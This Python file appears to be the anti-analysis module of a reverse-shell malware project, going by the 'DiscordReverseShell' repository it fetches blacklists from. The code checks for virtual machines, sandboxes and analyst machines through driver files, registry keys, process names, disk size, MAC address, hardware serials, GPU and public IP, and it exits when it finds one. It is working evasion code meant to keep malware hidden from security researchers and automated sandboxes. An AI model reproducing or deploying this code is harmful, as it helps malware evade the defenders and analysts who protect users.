import re
import uuid
import wmi
import requests
import os
import ctypes
#import sys
import subprocess
import socket
import psutil

    
class Antidebug:
    def main(self):
        if self.disk_check():
            return True
        if self.processes_check() or self.reg_check() or self.drivers_check() or self.profiles() \
        or self.ip_check() or self.hwid_check() or self.gpu_check() or self.pc_check() or self.mac_check():
            return True
        
    
    def disk_check(self):
        min_size = 60
        disks = []
        for i in psutil.disk_partitions(all=False):
            if os.name == "nt" and ("cdrom" in i.opts or i.fstype == ""):
                continue
            usage = psutil.disk_usage(i.mountpoint)
            disks.append((i.device, int(usage.total // (2**30))))

        for disk in disks:
            if disk[0] == "C:\\" and disk[1] <= min_size:
                return True


    def drivers_check(self):
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmci.sys"):
            return True
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmhgfs.sys"):
            return True
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmmouse.sys"):
            return True
            
        if  os.path.exists(r"C:\WINDOWS\system32\drivers\vmsci.sys"):
            return True
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmusbmouse.sys"):
            return True
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmx_svga.sys"):
            return True
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\VBoxMouse.sys"):
            return True


    def reg_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run([cmd, "DriverDesc"], shell=True, stderr=subprocess.PIPE)
        reg2 = subprocess.run([cmd, "ProviderName"], shell=True, stderr=subprocess.PIPE)
        if reg1.returncode == 0 and reg2.returncode == 0:
            return True


    def processes_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        #process = subprocess.run('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="', shell=True, stderr=subprocess.PIPE) #process = subprocess.Popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="', shell=True, stdout=subprocess.PIPE).communicate()[0].decode() #process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        #processList = []
        #for processNames in process.split(" "):
        #    if ".exe" in processNames:
        #        processList.append(processNames.replace("K\n", "").replace("\n", ""))

        processList = []
        for process in psutil.process_iter():
            process_name = process.name()
            if process_name != "" and process_name.endswith(".exe"): 
                processList.append(process_name)

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            return True
                           
        if os.path.exists(vmware_dll): 
            return True
            
        if os.path.exists(virtualbox_dll):
            return True
        
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            return True
        except:
            pass        
        
        processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text.replace("\r", "").split("\n")
        for proc in processL:
            if proc in processList:
                return True
            
    def mac_check(self):
        mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        
        mac_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/mac.txt").text.replace("\r", "").split("\n")
        if mac_address in mac_list:
            return True
            
            
    def pc_check(self):
        vm_name = os.getlogin()
        _vm_name = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text.replace("\r", "").split("\n")
        if vm_name in _vm_name:
            return True
        vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_username.txt").text.replace("\r", "").split("\n")
        host_name = socket.gethostname()
        if host_name in vm_username:
            return True
            
            
    def hwid_check(self):
        current_machine_id = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
        hwid_vm = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/hwid.txt").text.replace("\r", "").split("\n")
        if current_machine_id in hwid_vm:
            return True
            
            
    def gpu_check(self):
        gpu = wmi.WMI().Win32_DisplayConfiguration()[0].Description.strip()

        gpu_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/gpu.txt").text.replace("\r", "").split("\n")
        if gpu in gpu_list:
            return True
         
            
    def ip_check(self):
        ip_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/ip.txt").text.replace("\r", "").split("\n")
        ip = requests.get("https://api.ipify.org").text
        if ip in ip_list:
            return True
           
            
    def profiles(self):
        guid_pc = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/guild.txt").text.replace("\r", "").split("\n")
        bios_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/bios_serial.txt").text.replace("\r", "").split("\n")
        baseboard_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/base_board_serial.txt").text.replace("\r", "").split("\n")
        serial_disk = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/disk_drive_serial.txt").text.replace("\r", "").split("\n")
        
        machine_guid = uuid.getnode()
        if f"{machine_guid}" in guid_pc:
            return True
        w = wmi.WMI()
        
        for bios in w.Win32_BIOS():
            bios_check = bios.SerialNumber
            if bios_check in bios_guid:
                return True 
        
        for baseboard in w.Win32_BaseBoard():
            base_check = baseboard.SerialNumber
            if base_check in baseboard_guid:
                return True
                
        for disk in w.Win32_DiskDrive():
            disk_serial = disk.SerialNumber
            if disk_serial in serial_disk:
                return True


if __name__ == "__main__":
    import sys
    if Antidebug().main() is not None:
        sys.exit(1)

